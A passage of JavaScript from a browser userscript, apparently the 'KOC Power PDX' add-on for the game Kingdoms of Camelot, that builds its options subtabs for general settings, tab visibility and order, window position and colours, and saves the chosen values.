		<b><BR><span class=boldRed><u>'+culang.impo+'</u>:</span> '+culang.nolangs+'</b></td></tr>		<TD></td>\
		<TD colspan=2><b>'+culang.lang+'</b>: <img width=18 height=18 src=http://koc-power-pdx.googlecode.com/svn/trunk/img/langflags/en.png title="'+culang.useLangEN+'"> en = '+culang.english+' | \
		<img width=18 height=18 src=http://koc-power-pdx.googlecode.com/svn/trunk/img/langflags/de.png title="'+culang.useLangDE+'"> de = '+culang.german+' | <img width=18 height=18 src=http://koc-power-pdx.googlecode.com/svn/trunk/img/langflags/fr.png title="'+culang.useLangFR+'"> fr = '+culang.french+' | <img width=18 height=18 src=http://koc-power-pdx.googlecode.com/svn/trunk/img/langflags/it.png title="'+culang.useLangIT+'"> it = '+culang.italy+' | <img width=18 height=18 src=http://koc-power-pdx.googlecode.com/svn/trunk/img/langflags/es.png title="'+culang.useLangES+'"> es = '+culang.espaniol+' <BR><img width=18 height=18 src=http://koc-power-pdx.googlecode.com/svn/trunk/img/langflags/tr.png title="'+culang.useLangTR+'"> tr = '+culang.turk+' | <img width=18 height=18 src=http://koc-power-pdx.googlecode.com/svn/trunk/img/langflags/gr.png title="'+culang.useLangGR+'"> gr = '+culang.greece+' \
		| <img width=18 height=18 src=http://koc-power-pdx.googlecode.com/svn/trunk/img/langflags/pt.png title="'+culang.useLangPT+'"> pt = '+culang.portuguese+' \
		- '+culang.Ocomming+'</td></tr>	<TR><TD colspan=2><div class=pdxStat>'+culang.HpdxInfoBar+'</div></td></tr>		<TD></td>		<TD><b>'+culang.Oclock+'</b>: '+ htmlSelector({noneTimeZone:''+culang.none+'', gmtTimeZone:''+culang.OtogGmtClock+'', estTimeZone:''+culang.OtogEstClock+'', cestTimeZone:''+culang.OtogCestClock+'', pstTimeZone:''+culang.OtogPSTClock+''},Options.pdxTimeZones,'id=pdxTimeZones') +' '+culang.OtogTimeZone+' <b>(</b><span class=boldRed>'+culang.needRefresh+'</span><b>)</b>';
        m+= '</td></tr>';
		m += '<TD><INPUT id=togpdxLangFlag type=checkbox /></td><TD>'+culang.pdxLangFlag+' <img height=18 width=17 src=http://koc-power-pdx.googlecode.com/svn/trunk/img/langflags/'+culang.langflag+'-24x24.png title="'+culang.pdxLangInfoNote+'"></td></tr>';
		m += '<TD><INPUT id=togpdxTime type=checkbox /></td><TD>'+culang.pdxDate+'</td></tr></table> '+ strButton20(''+culang.resetall+'', 'id=ResetALL') +'<HR><B><u>'+culang.impnote+'</u>:</b> '+culang.Onote +'</div>';

		t.optionsDiv.innerHTML = m;
  
		t.changeOpt ('pbeverymins', 'pbEveryMins' , RefreshEvery.setTimer);
		t.togOpt ('pbEveryEnable', 'pbEveryEnable', RefreshEvery.setEnable);
		t.togOpt ('togForceMarchUpdates', 'forceMarchUpdate', Tabs.Marches.setEnable);
		t.togOpt ('pballowWinMove', 'pbWinDrag', mainPop.setEnableDrag);
		t.togOpt ('pbTrackWinOpen', 'pbTrackOpen');
		t.togOpt ('pbHideOnGoto', 'hideOnGoto');  
		t.togOpt ('pdxwidescreenEnable', 'widescreen');
		t.togOpt ('pdxSessionRefresh', 'sessionRefresh');
		t.togOpt ('togSmiley', 'Smiley');	
		t.togOpt ('togpdxLangFlag', 'pdxLangFlag');
		t.togOpt ('togpdxTime', 'pdxTime');
		t.togOpt ('pdxTournamentCheck', 'enableCheckTournament');
		document.getElementById('EmoHelp').addEventListener('click', function(){ t.EmoHelp(); }, false);	
		document.getElementById('pbupdate').addEventListener ('change', t.e_updateChanged, false);
		document.getElementById('pbupdatebeta').addEventListener ('change', function(){
			GlobalOptions.pbupdatebeta = document.getElementById('pbupdatebeta').value;
			AutoUpdater_104137.beta = GlobalOptions.pbupdatebeta;
			GM_setValue ('GlobalOptions_??', JSON2.stringify(GlobalOptions));
			saveGlobalOptions();
      },false);

	   document.getElementById('pbupdatenow').addEventListener ('click', function(){
	   AutoUpdater_104137.call(true,true);
	    },false);
		
				document.getElementById('pdxTimeZones').addEventListener ('change', function(){
			Options.pdxTimeZones = document.getElementById('pdxTimeZones').value;
			GM_setValue ('Options2_??', JSON2.stringify(Options));
			saveOptions();
      },false);		
				document.getElementById('pdxSoundSourceSever').addEventListener ('change', function(){
			Options.pdxSoundSourceSever = document.getElementById('pdxSoundSourceSever').value;
			GM_setValue ('Options2_??', JSON2.stringify(Options));
			saveOptions();
      },false);				
	  document.getElementById('pdxSourceSever').addEventListener ('change', function(){
			Options.pdxSourceSever = document.getElementById('pdxSourceSever').value;
			GM_setValue ('Options2_??', JSON2.stringify(Options));
			saveOptions();
      },false);
		document.getElementById('ResetALL').addEventListener ('click', function(){
			var serverID = getServerId();
				RemoveList = (GM_listValues());
				for (i=0;i<RemoveList.length;i++){
				logit(RemoveList[i]);
				GM_deleteValue(RemoveList[i]);
			}
			ResetAll=true;
			reloadKOC();
		},false);
		document.getElementById('pbupdatelanglist').addEventListener ('click', function () {
			GM_xmlhttpRequest({
			method: 'GET',
			url: 'http://koc-power-pdx.googlecode.com/svn/trunk/langpack/',
			headers: {
			'Accept': 'text/javascript',
		},
    onload: function(responseDetails) {
		var exp = /(\w\w)(?=.js<\/a>)/gim;
		var str = responseDetails.responseText;
		var str = str.match(exp);
		for (i in str) {
			if (str.length > i) {
				if(str[i]=="SR") continue;// exclude string resource file
				LangOptions.langpacks[str[i]] = true;
			};
		}
		saveLangOptions();
    }
});
	  }, false);
	  document.getElementById('pbLang').addEventListener ('change', function () {
				LangOptions.culang = this.options[this.selectedIndex].text ;
				saveLangOptions();
	  }, false);

    } catch (e) {
     // myDiv.div.innerHTML = '<PRE>'+ e.name +' : '+ e.message +'</pre>';
    }	
  },

// OPTIONS SUBTAB { TABS }
   showTabs : function (){
    var t = Tabs.Options;

    try {
		var m = '<DIV style=" max-height:618px;"><DIV class=pdxStat>'+culang.HTabSet+'</div><table class="pdxTab">\
			<tr><td colspan="2"><u><b>1. '+culang.disableTabs+' </b></u></td><td><input type="checkbox" id="togxChangePartner" /></td><td>'+culang.xChange+'</td><td colspan="4"><b><u>2. '+culang.OallianceWebsite+' </u></b></td></tr>\
			<tr><td><input  type="checkbox" id="togdisableTournamentTab" /></td>  <td>'+culang.tournament+'</td>    <td><input type="checkbox" id="togWSCalc" /></td>    <td>'+culang.Calc+'</td>    <td><input type="checkbox" id="togAllyWebTab" /></td><td width="225" colspan="3">'+culang.OallianceWebsite+' </td></tr>\
			<tr><td width="20"><input type="checkbox" id="togdisableWildTab" /></td><td>'+culang.wild+'</td><td><input type="checkbox" id="togkocDunnoTab" /></td><td>'+culang.kocDunno+'</td><td><input  type="checkbox" id="togAllyChatTab" /></td><td colspan="3">'+culang.OallianceTabName2+'</td>  </tr>  <tr>    <td><input  type="checkbox" id="togdisableKnightsTab" /></td>    <td>'+culang.knights+'</td>    <td><input type="checkbox" id="togWSWiKien" /></td>    <td>'+culang.WiKien+'</td><td colspan="4">'+culang.OallianceTabName+'</td>\  </tr>\
			<tr><td><input type="checkbox" id="togdisableCombatTab" /></td>    <td>'+culang.combat+'</td>    <td><input type="checkbox" id="togWSWiKide" /></td>    <td>'+culang.WiKide+'</td> <td>&nbsp;</td><td colspan="3"><input  type="text" id="changeAETabLabel" value="'+StyleOptions.pdxAETabLabel+'" size="15" maxlength="15" /></td></tr>\
			<tr><td><input  type="checkbox" id="togdisableSpamTab" /></td>    <td>'+culang.spam+'</td>    <td><input type="checkbox" id="togWSImo" /></td>    <td>'+culang.Imo+' ('+culang.imsg+')</td><td colspan="4">'+culang.OallianceWebURL+'</td></tr>\
			<tr><td><input type="checkbox" id="togdisableFakeTab" /></td>    <td>'+culang.fake+'</td>    <td><input type="checkbox" id="togdisableAutoScoutTab" /></td>    <td>'+culang.scout+' (?)</td>    <td>&nbsp;</td>    <td colspan="3"><input  type="text" id="changeAlliancePage" value="'+StyleOptions.pdxAlliancePage+'" size="25" maxlength="60"/></td></tr>\
			<tr><td ><input  type="checkbox" id="togdisableResourceTab" /></td>    <td>'+culang.res+'</td>    <td>&nbsp;</td>    <td>&nbsp;</td>    <td colspan="4">'+culang.OallianceTabName2+'</td></tr>\
			<tr><td><input  type="checkbox" id="togdisableInventarTab" /></td>    <td>'+culang.inventar+'</td>    <td>&nbsp;</td>    <td>&nbsp;</td>    <td>&nbsp;</td>    <td colspan="3"><input  type="text" id="changeWSTabLabel" value="'+StyleOptions.WSTabLab+'" size="15" maxlength="15" /></td></tr>\
			<tr><td><input  type="checkbox" id="togWSUsr" /></td>    <td>'+culang.Usr+'</td>    <td>&nbsp;</td>    <td>&nbsp;</td>    <td colspan="4">'+culang.OallianceWebURL+'  #2 </td></tr>\
			<tr><td width="20"><input  type="checkbox" id="togWSUpdater" /></td>    <td width="201">'+culang.WSUpdater+'</td>    <td width="20">&nbsp;</td>    <td width="197">&nbsp;</td><td width="20">&nbsp;</td>\<td colspan="3"><input   type="text"  id="changeWebsitePage" value="'+StyleOptions.WebsitePageURL+'" size="25" maxlength="60"/></td></tr>\
				</table><div class=pdxStat>'+culang.HtabOrder+'</div><table width="700" border="0" cellspacing="0" cellpadding="0">\
			<tr ><td><input type="text" value="'+StyleOptions.toStats+'" id="togtoStats" size="1" maxlength="2" ></td><td>'+culang.overview+' - '+StyleOptions.toStats+'</td><td><input type="text"  value="'+StyleOptions.toWildnisse+'" id="togtoWildnisse" size="1" maxlength="2" ></td><td>'+culang.wild+' - '+StyleOptions.toWildnisse+'</td><td><input type="text" value="'+StyleOptions.toInfo+'" id="togtoInfo" size="1" maxlength="2" ></td><td>'+culang.info+' - '+StyleOptions.toInfo+'</td><td><input  type="text" value="'+StyleOptions.toTurnier+'" id="togtoTurnier" size="1" maxlength="2" ></td><td>'+culang.tournament+' - '+StyleOptions.toTurnier+'</td></tr>\
			<tr ><td><input type="text" value="'+StyleOptions.toHeiligtum+'" id="togtoHeiligtum" size="1" maxlength="2" ></td><td>'+culang.holyplace+' - '+StyleOptions.toHeiligtum+'</td><td><input type="text" value="'+StyleOptions.toFarmen+'" id="togtoFarmen" size="1" maxlength="2" ></td><td>'+culang.raid+' - '+StyleOptions.toFarmen+'</td><td><input type="text" value="'+StyleOptions.toAlliancePage+'" id="togtoAlliancePage" size="1" maxlength="2" ></td><td>'+StyleOptions.pdxAETabLabel+' - '+StyleOptions.toAlliancePage+'</td><td><input  type="text" value="'+StyleOptions.toInventar+'" id="togtoInventar" size="1" maxlength="2" ></td><td>'+culang.inventar+' - '+StyleOptions.toInventar+'</td></tr>\
			<tr><td><input type="text" value="'+StyleOptions.toBau+'" id="togtoBau" size="1" maxlength="2"></td> <td>'+culang.build+' - '+StyleOptions.toBau+'</td><td><input  type="text" value="'+StyleOptions.toMarsch+'" id="togtoMarsch" size="1" maxlength="2" ></td><td>'+culang.march+' - '+StyleOptions.toMarsch+'</td><td><input type="text" value="'+StyleOptions.toWebsitePage+'" id="togtoWebsitePage" size="1" maxlength="2" ></td><td>'+StyleOptions.WSTabLab+' - '+StyleOptions.toWebsitePage+'</td><td><input type="text" value="'+StyleOptions.toFake+'" id="togtoFake" size="1" maxlength="2" ></td><td>'+culang.fake+' - '+StyleOptions.toFake+'</td></tr>\
			<tr ><td><input type="text" value="'+StyleOptions.toAusbildung+'" id="togtoAusbildung" size="1" maxlength="2"></td><td>'+culang.train+' - '+StyleOptions.toAusbildung+'</td><td><input  type="text" value="'+StyleOptions.toAutoScout+'" id="togtoAutoScout" size="1" maxlength="2" ></td><td>'+culang.scout+' - '+StyleOptions.toAutoScout+'</td><td><input type="text" value="'+StyleOptions.toKoCdunno+'" id="togtoKoCdunno" size="1" maxlength="2" ></td><td>'+culang.kocDunno+' - '+StyleOptions.toKoCdunno+'</td><td><input type="text" value="'+StyleOptions.toCombat+'" id="togtoCombat" size="1" maxlength="2" ></td><td>'+culang.combat+' - '+StyleOptions.toCombat+'</td></tr>\
			<tr ><td><input type="text" value="'+StyleOptions.toKaserne+'" id="togtoKaserne" size="1" maxlength="2"></td><td>'+culang.autotrain+' - '+StyleOptions.toKaserne+'</td><td><input  type="text" value="'+StyleOptions.toWappen+'" id="togtoWappen" size="1" maxlength="2" ></td><td>'+culang.crest+' - '+StyleOptions.toWappen+'</td><td><input  type="text" value="'+StyleOptions.toUsr+'" id="togtoUsr" size="1" maxlength="2" ></td><td>'+culang.Usr+' - '+StyleOptions.toUsr+'</td><td><input type="text" value="'+StyleOptions.toCrafting+'" id="togtoCrafting" size="1" maxlength="2" ></td><td>'+culang.crafting+' - '+StyleOptions.toCrafting+'</td></tr>\
			<tr ><td><input type="text" value="'+StyleOptions.toTransport+'" id="togtoTransport" size="1" maxlength="2" /></td><td>'+culang.transport+' - '+StyleOptions.toTransport+'</td><td><input  type="text" value="'+StyleOptions.toDarkForest+'" id="togtoDarkForest" size="1" maxlength="2" ></td><td>'+culang.darkforest+' - '+StyleOptions.toDarkForest+'</td><td><input type="text" value="'+StyleOptions.toGCode+'" id="togtoGCode" size="1" maxlength="2" ></td><td>'+culang.WSUpdater+' - '+StyleOptions.toGCode+'</td><td><input type="text" value="'+StyleOptions.toEinstellung+'" id="togtoEinstellung" size="1" maxlength="2" ></td><td>'+culang.options+' - '+StyleOptions.toEinstellung+'</td></tr>\
			<tr ><td><input type="text" value="'+StyleOptions.toTruppen+'" id="togtoTruppen" size="1" maxlength="2"></td><td>'+culang.autoreassign+' - '+StyleOptions.toTruppen+'</td><td><input type="text" value="'+StyleOptions.toGeschenke+'" id="togtoGeschenke" size="1" maxlength="2" ></td><td>'+culang.gifts+' - '+StyleOptions.toGeschenke+'</td><td><input  type="text" value="'+StyleOptions.toWiKien+'" id="togtoWiKien" size="1" maxlength="2" ></td><td>'+culang.WiKien+' - '+StyleOptions.toWiKien+'</td><td><input type="text" value="'+StyleOptions.toLog+'" id="togtoLog" size="1" maxlength="2" ></td><td>'+culang.log+' - '+StyleOptions.toLog+'</td></tr>\
			<tr><td><input  type="text" value="'+StyleOptions.toMovement+'" id="togtoMovement" size="1" maxlength="2" ></td><td>'+culang.movement+' - '+StyleOptions.toMovement+'</td><td><input type="text" value="'+StyleOptions.toRessis+'" id="togtoRessis" size="1" maxlength="2" ></td><td>'+culang.resource+' - '+StyleOptions.toRessis+'</td><td><input  type="text"  value="'+StyleOptions.toWiKide+'" id="togtoWiKide" size="1" maxlength="2" ></td><td>'+culang.WiKide+' - '+StyleOptions.toWiKide+'</td><td><input type="text" value="'+StyleOptions.toxChange+'" id="togtoxChange" size="1" maxlength="2" ></td><td>'+culang.xChange+' - '+StyleOptions.toxChange+'</td></tr>\
			<tr><td><input type="text" value="'+StyleOptions.toSuchen+'" id="togtoSuchen" size="1" maxlength="2"></td><td>'+culang.search+' - '+StyleOptions.toSuchen+'</td><td><input type="text" value="'+StyleOptions.toMitteilung+'" id="togtoMitteilung" size="1" maxlength="2" ></td><td>'+culang.reports+' - '+StyleOptions.toMitteilung+'</td><td><input  type="text" value="'+StyleOptions.toImo+'" id="togtoImo" size="1" maxlength="2" ></td><td>'+culang.Imo+' - '+StyleOptions.toImo+'</td><td>&nbsp;</td><td>&nbsp;</td></tr>\
			<tr><td><input  type="text" value="'+StyleOptions.toSpieler+'" id="togtoSpieler" size="1" maxlength="2"></td><td>'+culang.player+' - '+StyleOptions.toSpieler+'</td><td><input type="text" value="'+StyleOptions.toAllianz+'" id="togtoAllianz" size="1" maxlength="2" ></td><td>'+culang.alliance+' - '+StyleOptions.toAllianz+'</td><td><input type="text" value="'+StyleOptions.toCalc+'" id="togtoCalc" size="1" maxlength="2" ></td><td>'+culang.Calc+' - '+StyleOptions.toCalc+'</td><td>&nbsp;</td><td>&nbsp;</td></tr>\
			<tr><td><input type="text" value="'+StyleOptions.toRitter+'" id="togtoRitter" size="1" maxlength="2" ></td><td>'+culang.knights+' - '+StyleOptions.toRitter+'</td><td><input type="text" value="'+StyleOptions.toSpam+'" id="togtoSpam" size="1" maxlength="2" ></td><td>'+culang.spam+' - '+StyleOptions.toSpam+'</td><td><input type="text" value="'+StyleOptions.toChat+'"  id="togtoChat" size="1" maxlength="2" ></td><td>'+culang.chat+' - '+StyleOptions.toChat+'</td><td>&nbsp;</td><td>&nbsp;</td></tr>\
			<tr><td><input type="text" value="'+StyleOptions.toThrone+'" id="togtoThrone" size="1" maxlength="2" ></td><td>'+culang.throne+' - '+StyleOptions.toThrone+'</td></tr>\
				</table><center>'+ strButton20(''+culang.Hreset+'', 'id=togResetStyleOpt') +'</center></div>';
		
	t.optionsDiv.innerHTML = m;
	  
	t.togpdxSO ('togdisableKnightsTab', 'disKnightsTab'); t.togpdxSO ('togdisableAutoScoutTab', 'disAutoScout');		t.togpdxSO ('togdisableWildTab', 'disWildTab');		t.togpdxSO ('togdisableCombatTab', 'disCombatTab');		t.togpdxSO ('togdisableSpamTab', 'disSpamTab');		t.togpdxSO ('togdisableFakeTab', 'disFakeTab');		t.togpdxSO ('togdisableResourceTab', 'disResTab');		t.togpdxSO ('togdisableTournamentTab', 'disTourTab');		t.togpdxSO ('togdisableInventarTab', 'disInvTab');		t.togpdxSO ('togAllyWebTab', 'enableWebTab');		t.togpdxSO ('togAllyChatTab', 'enableWebTab2');		t.togpdxSO ('togkocDunnoTab', 'enablekocDunno');		t.togpdxSO ('togxChangePartner', 'enablePartner');		t.togpdxSO ('togWSUpdater', 'enableWSUpdater');		t.togpdxSO ('togWSWiKien', 'enableWSWiKien');		t.togpdxSO ('togWSWiKide', 'enableWSWiKide');		t.togpdxSO ('togWSUsr', 'enableWSUsr');		t.togpdxSO ('togWSImo', 'enableWSImo');		t.togpdxSO ('togWSCalc', 'enableWSCalc');
	t.changepdxSO ('togtoThrone', 'toThrone'); t.changepdxSO ('togtoStats', 'toStats');	t.changepdxSO ('togtoHeiligtum', 'toHeiligtum');	t.changepdxSO ('togtoAutoScout', 'toAutoScout');	t.changepdxSO ('togtoBau', 'toBau');	t.changepdxSO ('togtoAusbildung', 'toAusbildung');		t.changepdxSO ('togtoKaserne', 'toKaserne');	t.changepdxSO ('togtoTransport', 'toTransport');		t.changepdxSO ('togtoTruppen', 'toTruppen');	t.changepdxSO ('togtoMovement', 'toMovement');		t.changepdxSO ('togtoSuchen', 'toSuchen');		t.changepdxSO ('togtoSpieler', 'toSpieler');		t.changepdxSO ('togtoRitter', 'toRitter');		t.changepdxSO ('togtoWildnisse', 'toWildnisse');		t.changepdxSO ('togtoFarmen', 'toFarmen');		t.changepdxSO ('togtoMarsch', 'toMarsch');		t.changepdxSO ('togtoWappen', 'toWappen');		t.changepdxSO ('togtoDarkForest', 'toDarkForest');		t.changepdxSO ('togtoGeschenke', 'toGeschenke');		t.changepdxSO ('togtoRessis', 'toRessis');		t.changepdxSO ('togtoMitteilung', 'toMitteilung');		t.changepdxSO ('togtoAllianz', 'toAllianz');		t.changepdxSO ('togtoSpam', 'toSpam');		t.changepdxSO ('togtoInfo', 'toInfo');		t.changepdxSO ('togtoAlliancePage', 'toAlliancePage');		t.changepdxSO ('togtoWebsitePage', 'toWebsitePage');		t.changepdxSO ('togtoKoCdunno', 'toKoCdunno');		t.changepdxSO ('togtoUsr', 'toUsr');		t.changepdxSO ('togtoGCode', 'toGCode');		t.changepdxSO ('togtoWiKien', 'toWiKien');		t.changepdxSO ('togtoWiKide', 'toWiKide');		t.changepdxSO ('togtoImo', 'toImo');		t.changepdxSO ('togtoCalc', 'toCalc');		t.changepdxSO ('togtoChat', 'toChat');		t.changepdxSO ('togtoTurnier', 'toTurnier');		t.changepdxSO ('togtoInventar', 'toInventar');		t.changepdxSO ('togtoFake', 'toFake');		t.changepdxSO ('togtoCombat', 'toCombat');		t.changepdxSO ('togtoEinstellung', 'toEinstellung');		t.changepdxSO ('togtoLog', 'toLog');		t.changepdxSO ('togtoxChange', 'toxChange');		t.changepdxSO ('togtoCrafting', 'toCrafting');
	t.changepdxSO ('changeAlliancePage', 'pdxAlliancePage');		t.changepdxSO ('changeAETabLabel', 'pdxAETabLabel');
	t.changepdxSO ('changeWebsitePage', 'WebsitePageURL');		t.changepdxSO ('changeWSTabLabel', 'WSTabLab');

	document.getElementById('togResetStyleOpt').addEventListener ('click', function(){
	var serverID = getServerId();
		RemoveList = (GM_listValues());
		for (i=0;i<RemoveList.length;i++){
		
			if (RemoveList[i] == "StyleOptions_"+serverID) GM_deleteValue(RemoveList[i]);
		}
		ResetStyleOptions=true;
		reloadKOC();
	},false);
    } catch (e) {
    }	
  },
// OPTIONS SUBTAB { POSITION }
 showPosition : function (){
    var t = Tabs.Options;
    try {
	m = '<DIV style=" max-height:500px;"><TABLE width=100% class=pdxTab cellspacing=0 cellpadding=0>\
	<TR><TD colspan=2><div class=pdxStat>'+culang.HkpwrsP+'</div></td></tr>\
	<TR><TD width="10"><INPUT id=pbChatREnable type=checkbox /></td><TD width="98%">'+culang.OpbChatREnable  +' <font color=#FF0000>('+culang.needWide+')</font></td></tr>\
		<TR><TD>&nbsp;</td><TD>'+culang.chatWidth+': <INPUT  type=text id=pbchatWidth value="'+Options.chatWidth+'" size=7 maxlength=7></td></tr>\
	<TR><TD><INPUT id=pbWMapEnable type=checkbox /></td><TD>'+culang.OpbWMapEnable+ ' <font color=#FF0000>('+culang.need+' '+culang.OneedWideARefresh+')</font></td></tr>\
	<TR><TD></td><TD>'+culang.Opbwidewidth +' <INPUT id=pbwidewidth value="'+Options.widewidth+'" type=text size=8 maxlength=6 \></td></tr>\
	<TR><TD>&nbsp;</td><TD>'+culang.OtogTabWidth +'<INPUT  type=text id=togTabWidth value="'+Colors.PopUpWidth+'" size=7 maxlength=7></td></tr>\
	<TR><TD>&nbsp;</td><TD>'+culang.OwideOptwide+' - '+culang.OwideOptown+' <INPUT type=text id=togWideScreenWidth value="'+Colors.WideScreenWidth+'" size=7 maxlength=7></td></tr>\
	<TR><TD><INPUT id=MapExtra type=checkbox /></td><TD>'+culang.OMapExtra +'</td></tr>\
	</table><HR><B><u>'+culang.impnote+'</u>:</b> '+culang.Onote +'</div>';
		   
	t.optionsDiv.innerHTML = m;

	t.togOpt ('MapExtra', 'MapShowExtra');
	t.togOpt ('pbChatREnable', 'pbChatOnRight', WideScreen.setChatOnRight);
	t.togOpt ('pbWMapEnable', 'pbWideMap', WideScreen.useWideMap);
    t.changeOpt ('pbwidewidth', 'widewidth');
		// t.togpdxSO ('togmodChatlistBoarder', 'modChatlistBoarder'); 		<TR><TD><INPUT id=togmodChatlistBoarder type=checkbox /></td><TD>Neuer Chat Style</td></tr>
		
	t.changeColorOpt ('togTabWidth', 'PopUpWidth');
	t.changeColorOpt ('togWideScreenWidth', 'WideScreenWidth');
		document.getElementById('pbchatWidth').addEventListener ('change', function () {
	     var x = document.getElementById('pbchatWidth').value;
	    if (isNaN(x) || x<600 || x>1000){
	     document.getElementById('pbchatWidth').value = 700; 
	    }
	    Options.chatWidth = x;
	    saveOptions();
      }, false);
//'+culang.Opbchattop +' <INPUT id=pbchattop type=text size=3 maxlength=6 \> '+culang.left+' <INPUT id=pbchatleft type=text size=3 maxlength=6 \> '+culang.Ochathigh+': <INPUT id=pbchathoehel type=text size=3 maxlength=6 \>
//<span style=\"font-size:10px; color:#555; line-height:18px; \"><font color=#600000><B><u>'+culang.impo+'</u></b></font>: '+culang.Opositionimp+'</span>
	// t.changeOpt ('pbchattop', 'chatTop');
	// t.changeOpt ('pbchatleft', 'chatLeft');	
	// 
	//t.changeOpt ('pbchathoehe', 'chatHoehe');  '+culang.Oboarderhigh+': <INPUT id=pbchathoehe type=text size=3 maxlength=6 \> 
	//t.changeOpt ('pbchathoehel', 'chatHoeheL');
	

    } catch (e) {
    }
  },
// OPTIONS SUBTABS { COLORS }
  showColors : function (){
    var t = Tabs.Options;
    try { name
	m = '<DIV style=" max-height:500px;"><div class=pdxStat>'+culang.Hcolors+' '+culang.Handstyle+' </div><TABLE width=95%>\
		<TR><TD ><b><u>1.'+culang.general+'</u></b></td><TD width="113"><b><u>1.1 '+culang.colors+'</u></b></td><TD colspan="2"><b><u>2 '+culang.chat+'</u></b></td><TD width="113"><u><b>2.1 '+culang.colors+'</b></u></td></tr>\
		<TR><TD width="334">'+culang.OtogChatMainTitle+'</td><TD width="113"><INPUT  style="background:'+Colors.MainTitle+'" type=text id=togChatMainTiltle value="'+Colors.MainTitle+'" size=7 maxlength=7></td><TD width="29"><INPUT type=checkbox id=togLowFoodBGsel /></td><TD width="239">'+culang.OLowFoodAlert+'</td><TD  width="113"><INPUT style="background:'+Colors.lowFoodBG+'" type=text id=toglowFoodBG value="'+Colors.lowFoodBG+'" size=7 maxlength=7></td></tr>\
		<TR><TD >'+culang.OtogChatMainTiltleSch +'</td><TD width="113" ><INPUT style="background:'+Colors.MainTitleSch+'" type=text id=togChatMainTiltleSch value="'+Colors.MainTitleSch+'" size=7 maxlength=7></td><TD ><INPUT type=checkbox id=togChatLead /></td><TD >'+culang.OtogChatLeaders+'</td><TD  width="113" ><INPUT style="background:'+Colors.ChatLeader+'" type=text id=togChatLeaders value="'+Colors.ChatLeader+'" size=7 maxlength=7></td></tr>\
		<TR><TD>'+culang.OtogStatsU+'</td><TD width="113"><INPUT type=text style="background:'+Colors.StatsU+'"  id=togStatsU value="'+Colors.StatsU+'" size=7 maxlength=7></td><TD><INPUT type=checkbox id=togChatAttack /></td><TD>'+culang.OtoggChatAngriff+'</td><TD width="113" ><INPUT type=text style="background:'+Colors.ChatAngriff+'" id=toggChatAngriff value="'+Colors.ChatAngriff+'" size=7 maxlength=7></td></tr>\
		<TR><TD >'+culang.OtogDarkRow +': </td><TD width="113" ><INPUT  style="background:'+Colors.DarkRow+'" type=text id=togDarkRow value="'+Colors.DarkRow+'" size=7 maxlength=7></td><TD ><INPUT type=checkbox id=togChatWhisper /></td><TD >'+culang.OtogChatWhisper+'</td><TD width="113" ><INPUT style="background:'+Colors.WhisperBG+'" type=text id=togWhisperBG value="'+Colors.WhisperBG+'" size=7 maxlength=7></td></tr>\
		<TR><TD>'+culang.OtogButClick+': </td><TD   width="113"><INPUT style="background:'+Colors.ButtonSelected+'" type=text id=togButClick value="'+Colors.ButtonSelected+'" size=7 maxlength=7></td><TD><INPUT type=checkbox id=togWildAttacksel /></td><TD>'+culang.OtogWildAttack+'</td><TD width="113" ><INPUT style="background:'+Colors.WildAttack+'" type=text id=togWildAttack value="'+Colors.WildAttack+'" size=7 maxlength=7></td></tr>\
		<TR><TD >'+culang.OtogOverDarkRow+'</td><TD width="113" ><INPUT  style="background:'+Colors.OverviewDarkRow+'" type=text id=togOverDarkRow value="'+Colors.OverviewDarkRow+'" size=7 maxlength=7></td><TD >&nbsp;</td><TD >&nbsp;</td><TD>&nbsp;</td></tr>\
		<TR><TD >'+culang.OtogMainPop +':</td>	<TD  width="113"><INPUT style="background:'+Colors.MainPop+'" type=text id=togMainPop value="'+Colors.MainPop+'" size=7 maxlength=7></td><TD>&nbsp;</td><TD>&nbsp;</td><TD >&nbsp;</td></tr>\
		<TR><TD >'+culang.OtogTabHinPop+'</td><TD width="113" ><INPUT type=text style="background:'+Colors.TabHinPop+'" id=togTabHinPop value="'+Colors.TabHinPop+'" size=7 maxlength=7></td><TD colspan="2" >'+culang.OtogTabTrans +'</td><TD><INPUT type=text id=togTabTrans value="'+Colors.TabTrans+'" size=3 maxlength=3></td></tr>\
		<TR><TD>'+culang.tournament+' - '+culang.tab+' </td><TD><INPUT type=text id=togTournament style="background:'+Colors.Tourn+'" value="'+Colors.Tourn+'" size=7 maxlength=7></td><TD colspan="3"><span class=boldRed><u>'+culang.OHattention+'</u></span><b>: '+culang.OattentionImp+'</b></td></tr>\
		<TR><TD >'+culang.OtogstyleRows+'</td><TD ><INPUT style="background:'+Colors.styleRows+'" type=text id=togstyleRows value="'+Colors.styleRows+'" size=7 maxlength=7></td><TD colspan="2" >&nbsp;</td><TD >&nbsp;</td></tr>\
		<TR><TD>'+culang.OtogscToolbarBG +' #1</td><TD width="113" ><INPUT type=text style="background:'+Colors.scToolbarBG+'" id=togscToolbarBG value="'+Colors.scToolbarBG+'" size=7 maxlength=7></td><TD colspan="2" ></td><TD></td></tr>\
		<TR><TD >'+culang.OtogscToolbarBG+' #2</td><TD width="113" ><INPUT style="background:'+Colors.scToolbarBG2+'" type=text id=togscToolbarBG2 value="'+Colors.scToolbarBG2+'" size=7 maxlength=7></td><TD colspan="2">&nbsp;</td><TD width="113">&nbsp;</td></tr>\
		<TR><TD >'+culang.shadowCol+'</td><TD width="113" ><INPUT style="background:'+Colors.OptShadowCol+'" type=text id=togOptShadowCol value="'+Colors.OptShadowCol+'" size=7 maxlength=7></td><TD colspan="3">'+culang.size+' <INPUT type=text id=togOptShadow value="'+Colors.OptShadow+'" size=3 maxlength=1> <b>('+culang.max+'. 1-9 | 0 = '+culang.buttonoff+' <b>)</b></td></tr>\
		</table><center>'+ strButton20(''+culang.ObtnResetAllColors+'', 'id=togResetColors') +' '+culang.colorResetNote+'</center><HR><span class=boldRed><u>'+culang.impo+'</u>:</span>'+culang.OstyleChangeRefresh+'</div>';

	t.optionsDiv.innerHTML = m;
	t.togOpt ('togChatWhisper', 'chatwhisper');		t.togOpt ('togWildAttacksel', 'chatWildAttack');	t.togOpt ('togChatLead', 'chatLeaders');	t.togOpt ('togLowFoodBGsel', 'enableFoodChatAlertBG');	t.togOpt ('togChatAttack', 'chatAttack');
